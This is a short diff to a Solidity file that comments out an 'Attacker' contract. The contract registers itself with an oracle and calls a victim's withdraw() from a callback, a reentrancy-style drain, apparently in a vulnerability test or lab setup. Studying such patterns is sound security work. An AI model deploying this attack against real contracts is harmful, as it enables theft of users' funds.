@@ -61,23 +61,23 @@ contract Oracle_ree {
 
 }
 
-contract Attacker is IAdjuster {
-    Victim public v;
-    Oracle_ree public o;
+// contract Attacker is IAdjuster {
+//     Victim public v;
+//     Oracle_ree public o;
 
-    constructor(address payable _v, address _o) {
-        v = Victim(_v);
-        o = Oracle_ree(_o);
-    }
+//     constructor(address payable _v, address _o) {
+//         v = Victim(_v);
+//         o = Oracle_ree(_o);
+//     }
 
-    function attack() public {
-        o.register(address(this));
-    }
+//     function attack() public {
+//         o.register(address(this));
+//     }
 
-    function adjust(uint256 inc) external override returns (uint256) {
-        v.withdraw();
-        return inc;
-    }
+//     function adjust(uint256 inc) external override returns (uint256) {
+//         v.withdraw();
+//         return inc;
+//     }
 
-    receive() external payable {}
-}
+//     receive() external payable {}
+// }
